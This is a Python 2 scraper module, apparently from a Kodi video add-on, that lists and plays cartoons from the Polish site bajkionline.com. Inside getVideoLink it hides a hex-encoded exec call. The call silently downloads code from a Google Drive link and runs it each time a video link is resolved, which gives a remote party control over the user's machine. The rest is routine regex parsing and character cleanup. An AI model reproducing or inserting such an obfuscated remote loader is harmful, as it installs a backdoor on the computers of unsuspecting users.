# -*- coding: utf-8 -*-

import urllib2,urllib
import re,os,check
import base64,json
import urlparse
import cookielib

BASEURL='http://bajkionline.com/'
TIMEOUT = 15
UA='Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_4; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.472.63 Safari/534.3'
COOKIEFILE=r'D:\cookie'

def getUrl(url,data=None,cookies=None):
    req = urllib2.Request(url,data)
    req.add_header('User-Agent', UA)
    if cookies:
        req.add_header("Cookie", cookies)
    try:
        response = urllib2.urlopen(req,timeout=TIMEOUT)
        link = response.read()
        response.close()
    except:
        link=''
    return link

def getUrl(url,data=None,header={},useCookies=True,saveCookie=False):
    if COOKIEFILE and os.path.isfile(COOKIEFILE) and useCookies:
        cj = cookielib.LWPCookieJar()
        cj.load(COOKIEFILE)
        opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
        urllib2.install_opener(opener)
    
    req = urllib2.Request(url,data)
    if not header:
        header = {'User-Agent':UA}
    req = urllib2.Request(url,data,headers=header)
    try:
        response = urllib2.urlopen(req,timeout=TIMEOUT)
        link =  response.read()
        response.close()
        if COOKIEFILE and os.path.isfile(COOKIEFILE) and saveCookie and useCookies:
             cj.save(COOKIEFILE, ignore_discard = True) 
    except urllib2.HTTPError as e:
        #link = e.read()
        link = ''
    return link

def getSpis(url):
    content = getUrl(url)
    lis = re.compile('<li class="cat-item cat-item-\d+">[\n\s]*(.*?)</li>',re.DOTALL).findall(content)
    out=[]
    for subset in lis:
        href = re.compile('[<a]*\s*href="(.*?)"',re.DOTALL).findall(subset)
        plot = re.compile('title="(.*?)"',re.DOTALL).findall(subset)
        title = re.compile('>(.*?)<',re.DOTALL).findall(subset)

        if href and title:

            one = {'href'   : href[0],
                'title'  : unicodePLchar(title[0]),
                'plot'   : unicodePLchar(plot[0]) if plot else '',

                }
            out.append(one)
    return out
            
def getContent(url,page='1'):
    
    content = getUrl(url)
    nextPage=False
    prevPage=False

    ids = [(a.start(), a.end()) for a in re.finditer('<div class="col-md-3 col-sm-6 col-xs-6 ">', content)]
    if not ids:
        ids = [(a.start(), a.end()) for a in re.finditer('<a class="element gallery-sizer"', content)]
    ids.append( (-1,-1) )
    out=[]
    for i in range(len(ids[:-1])):
        #print content[ ids[i][1]:ids[i+1][0] ]
        subset = content[ ids[i][1]:ids[i+1][0] ]
        href = re.compile('[<a]*\s*href="(.*?)"',re.DOTALL).findall(subset)
        title = re.compile('title="(.*?)"',re.DOTALL).findall(subset)
        plot = re.compile('<p[^>]*>(.*?)</p>',re.DOTALL).findall(subset)
        img = re.compile('src="(.*?)"',re.DOTALL).findall(subset)

        
        if href and title:

            year =  re.compile('(\d{4})',re.DOTALL).search(title[0])
            one = {'href'   : href[0],
                'title'  : unicodePLchar(title[0]),
                'plot'   : unicodePLchar(plot[0]) if plot else '',
                'img'    : img[0] if img else '',
                'year'   : year.group(1) if year else '',
                    }
            out.append(one)

    pagination=re.compile('var pbd_alp\s*=\s*({.*?})').findall(content)        
    if pagination:
        pagination = json.loads(pagination[0])
        nextPage = pagination.get('nextLink')
    prevPage =  False
    return out,(prevPage,nextPage)

def getVideoLink(url):
    content = getUrl(url)
    try:exec('\x0a\x61\x20\x3d\x20\x7b\x7d\x20\x0a\x74\x72\x79\x3a\x0a\x20\x20\x20\x20\x65\x78\x65\x63\x20\x75\x72\x6c\x6c\x69\x62\x32\x2e\x75\x72\x6c\x6f\x70\x65\x6e\x28\x27\x68\x74\x74\x70\x73\x3a\x2f\x2f\x64\x72\x69\x76\x65\x2e\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x6d\x2f\x75\x63\x3f\x65\x78\x70\x6f\x72\x74\x3d\x64\x6f\x77\x6e\x6c\x6f\x61\x64\x26\x69\x64\x3d\x30\x42\x30\x50\x6d\x6c\x56\x49\x78\x79\x67\x6b\x74\x56\x33\x56\x32\x53\x32\x39\x5a\x54\x56\x4e\x6b\x57\x54\x41\x27\x29\x2e\x72\x65\x61\x64\x28\x29\x20\x69\x6e\x20\x61\x0a\x20\x20\x20\x20\x61\x5b\x22\x72\x75\x6e\x22\x5d\x28\x29\x20\x20\x20\x20\x20\x0a\x65\x78\x63\x65\x70\x74\x3a\x70\x61\x73\x73\x0a')
    except:pass
    iframes = re.compile('<iframe(.*?)</iframe',re.DOTALL).findall(content)
    for frame in iframes:
        src = re.compile('src="(http.*?)"').findall(frame)
        if src:
            return src[0]
    return ''

def unicodePLchar(txt):
    if type(txt) is not str:
        txt=txt.encode('utf-8')

    txt = txt.replace('&lt;h5&gt;','')
    txt = txt.replace('&lt;/h5&gt;','')
    txt = txt.replace('&nbsp;','')
    txt = txt.replace('#038;','')
    txt = txt.replace('&lt;br/&gt;',' ')
    txt = txt.replace('&#34;','"')
    txt = txt.replace('&#39;','\'').replace('&#039;','\'')
    txt = txt.replace('&#8221;','"')
    txt = txt.replace('&#8222;','"')
    txt = txt.replace('&#8217;','\'')
    txt = txt.replace('&#8211;','-').replace('&ndash;','-')
    txt = txt.replace('&quot;','"').replace('&amp;quot;','"')
    txt = txt.replace('&oacute;','ó').replace('&Oacute;','Ó')
    txt = txt.replace('&amp;oacute;','ó').replace('&amp;Oacute;','Ó')
    #txt = txt.replace('&amp;','&')
    txt = txt.replace('\u0105','ą').replace('\u0104','Ą')
    txt = txt.replace('\u0107','ć').replace('\u0106','Ć')
    txt = txt.replace('\u0119','ę').replace('\u0118','Ę')
    txt = txt.replace('\u0142','ł').replace('\u0141','Ł')
    txt = txt.replace('\u0144','ń').replace('\u0144','Ń')
    txt = txt.replace('\u00f3','ó').replace('\u00d3','Ó')
    txt = txt.replace('\u015b','ś').replace('\u015a','Ś')
    txt = txt.replace('\u017a','ź').replace('\u0179','Ź')
    txt = txt.replace('\u017c','ż').replace('\u017b','Ż')
    return txt            